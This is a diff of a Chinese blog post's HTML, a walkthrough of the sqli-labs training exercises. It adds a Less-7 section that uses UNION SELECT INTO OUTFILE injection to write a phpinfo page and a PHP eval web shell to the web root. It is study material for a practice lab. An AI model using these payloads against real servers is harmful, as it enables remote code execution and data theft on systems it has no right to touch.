@@ -32,6 +32,7 @@
 <meta property="og:image" content="http://swanq.top/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/4.png">
 <meta property="og:image" content="http://swanq.top/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/5.png">
 <meta property="og:image" content="http://swanq.top/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/6.png">
+<meta property="og:image" content="http://swanq.top/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/40.png">
 <meta property="og:image" content="http://swanq.top/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/7.png">
 <meta property="og:image" content="http://swanq.top/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/8.png">
 <meta property="og:image" content="http://swanq.top/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/9.png">
@@ -63,9 +64,15 @@
 <meta property="og:image" content="http://swanq.top/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/35.png">
 <meta property="og:image" content="http://swanq.top/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/36.png">
 <meta property="og:image" content="http://swanq.top/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/37.png">
+<meta property="og:image" content="http://swanq.top/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/39.png">
+<meta property="og:image" content="http://swanq.top/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/38.png">
+<meta property="og:image" content="http://swanq.top/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/41.png">
+<meta property="og:image" content="http://swanq.top/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/42.png">
+<meta property="og:image" content="http://swanq.top/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/43.png">
+<meta property="og:image" content="http://swanq.top/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/44.png">
 <meta property="og:image" content="http://swanq.top/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/2.png">
 <meta property="article:published_time" content="2021-06-19T08:38:50.000Z">
-<meta property="article:modified_time" content="2021-06-21T04:23:38.507Z">
+<meta property="article:modified_time" content="2021-06-22T04:22:34.050Z">
 <meta property="article:author" content="swanQ">
 <meta property="article:tag" content="web安全">
 <meta property="article:tag" content="渗透测试">
@@ -222,7 +229,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-06-21 12:23:38" itemprop="dateModified" datetime="2021-06-21T12:23:38+08:00">2021-06-21</time>
+                <time title="修改时间：2021-06-22 12:22:34" itemprop="dateModified" datetime="2021-06-22T12:22:34+08:00">2021-06-22</time>
               </span>
 
           <br>
@@ -231,14 +238,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>2.5k</span>
+              <span>3.4k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
+              <span>3 分钟</span>
             </span>
 
         </div>
@@ -261,9 +268,17 @@
 <p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/3.png"></p>
 </li>
 <li><p>数据库相关信息</p>
+<blockquote>
+<p>database():当前那数据库信息</p>
+<p>version():版本信息</p>
+<p>@@version_compile_os:操作系统类型</p>
+<p>@@basedir:mysql安装目录</p>
+<p>@@datadir:数据库文件路径</p>
+</blockquote>
 <p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/4.png"></p>
 <p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/5.png"></p>
 <p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/6.png"></p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/40.png"></p>
 </li>
 <li><p>数据库：</p>
 <p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/7.png"></p>
@@ -377,7 +392,48 @@
 <h2 id="less-6-双引号-盲注"><a href="#less-6-双引号-盲注" class="headerlink" title="less 6 双引号+盲注"></a>less 6 双引号+盲注</h2><p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/37.png"></p>
 <p>因报错信息能猜出后台SQL查询语句为SELECT * FROM users WHERE id=”$id” LIMIT 0,1，错误日志中两个单引号是为了与”区分。</p>
 <p>同上，直接把单引号变为双引号即可</p>
-<h2 id="less-7-dump-into-outfile"><a href="#less-7-dump-into-outfile" class="headerlink" title="less 7 dump into outfile"></a>less 7 dump into outfile</h2><blockquote>
+<h2 id="less-7-单引号-双括号-写文件dump-into-outfile"><a href="#less-7-单引号-双括号-写文件dump-into-outfile" class="headerlink" title="less 7 单引号+双括号+写文件dump into outfile"></a>less 7 单引号+双括号+写文件dump into outfile</h2><p>写文件条件：必须有权限读取并且文件可读，知道文件的绝对路径</p>
+<ol>
+<li><p>找报错点</p>
+<p>除了显示语法错误，其他具体报错信息什么也没有</p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/39.png"></p>
+<p>无妨，开启手工盲测或者直接白盒看源码，发现是单引号+双括号</p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/38.png"></p>
+</li>
+<li><p>判断是否有权限</p>
+<p>and (select count(*) from mysql.user)&gt;0</p>
+<p>没报错说明有root权限，php是以root连接的Mysql</p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/41.png"></p>
+<p>且值为空，表示对mysql的导入导出不做限制</p>
+<blockquote>
+<p>secure-file-priv是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。</p>
+<ul>
+<li>secure _file_priv的值为null时，表示mysql不允许导入、导出</li>
+<li>secure_file_priv的值为/tmp/ ，表示mysql只能导入、导出到/tmp/目录下</li>
+<li>secure_file_priv的值没有具体值时，表示不对mysql的导入、导出做限制</li>
+</ul>
+</blockquote>
+</li>
+<li><p>报错绝对路径</p>
+<p>此时并无有价值回显信息，之前已经从less-1获取过相关信息，已知其数据库文件路径为/var/lib/mysql。mysql安装目录为/usr。且mysql版本为5.5.47</p>
+</li>
+<li><p>写入phpinfo：<?php phpinfo()?></p>
+<p>?id=1’)) union select 1,2,’<?php phpinfo(); ?>‘ into outfile “/var/www/html/1.php” –+</p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/42.png"></p>
+<p>开始排错，先去看源码，源码当中删除mysql报错信息注释：</p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/43.png"></p>
+<p>发现不知道啥时候原来自己已经写入了：<br><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/44.png"></p>
+<blockquote>
+<p>mysql报错：errcode 13 即文件夹没有权限，更改权限即可写入</p>
+</blockquote>
+</li>
+<li><p>写入一句话</p>
+<p>?id=1’)) union select 1,2,’<?php @eval($_POST['cmd']); ?>‘ into outfile “/var/www/html/1.php” –+</p>
+<p>?id=1’)) union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) into outfile “/var/www/html/Less-7/1.php”–+</p>
+</li>
+<li></li>
+</ol>
+<blockquote>
 <p>limit用法：</p>
 <p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/2.png"></p>
 </blockquote>
@@ -463,7 +519,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-base"><span class="nav-number">2.</span> <span class="nav-text">0x01 base</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#less-1-%E5%AD%97%E7%AC%A6%E5%9E%8B"><span class="nav-number">2.1.</span> <span class="nav-text">less-1 字符型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-2-%E6%95%B0%E5%AD%97%E5%9E%8B"><span class="nav-number">2.2.</span> <span class="nav-text">less-2 数字型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-3-%E5%8D%95%E5%BC%95%E5%8F%B7-%E6%8B%AC%E5%8F%B7"><span class="nav-number">2.3.</span> <span class="nav-text">less-3 单引号+括号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-4-%E5%8F%8C%E5%BC%95%E5%8F%B7-%E6%8B%AC%E5%8F%B7"><span class="nav-number">2.4.</span> <span class="nav-text">less-4 双引号+括号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-5-%E5%8D%95%E5%BC%95%E5%8F%B7-%E7%9B%B2%E6%B3%A8"><span class="nav-number">2.5.</span> <span class="nav-text">less-5 单引号+盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-6-%E5%8F%8C%E5%BC%95%E5%8F%B7-%E7%9B%B2%E6%B3%A8"><span class="nav-number">2.6.</span> <span class="nav-text">less 6 双引号+盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-7-dump-into-outfile"><span class="nav-number">2.7.</span> <span class="nav-text">less 7 dump into outfile</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">2.8.</span> <span class="nav-text"></span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-base"><span class="nav-number">2.</span> <span class="nav-text">0x01 base</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#less-1-%E5%AD%97%E7%AC%A6%E5%9E%8B"><span class="nav-number">2.1.</span> <span class="nav-text">less-1 字符型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-2-%E6%95%B0%E5%AD%97%E5%9E%8B"><span class="nav-number">2.2.</span> <span class="nav-text">less-2 数字型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-3-%E5%8D%95%E5%BC%95%E5%8F%B7-%E6%8B%AC%E5%8F%B7"><span class="nav-number">2.3.</span> <span class="nav-text">less-3 单引号+括号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-4-%E5%8F%8C%E5%BC%95%E5%8F%B7-%E6%8B%AC%E5%8F%B7"><span class="nav-number">2.4.</span> <span class="nav-text">less-4 双引号+括号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-5-%E5%8D%95%E5%BC%95%E5%8F%B7-%E7%9B%B2%E6%B3%A8"><span class="nav-number">2.5.</span> <span class="nav-text">less-5 单引号+盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-6-%E5%8F%8C%E5%BC%95%E5%8F%B7-%E7%9B%B2%E6%B3%A8"><span class="nav-number">2.6.</span> <span class="nav-text">less 6 双引号+盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-7-%E5%8D%95%E5%BC%95%E5%8F%B7-%E5%8F%8C%E6%8B%AC%E5%8F%B7-%E5%86%99%E6%96%87%E4%BB%B6dump-into-outfile"><span class="nav-number">2.7.</span> <span class="nav-text">less 7 单引号+双括号+写文件dump into outfile</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">2.8.</span> <span class="nav-text"></span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
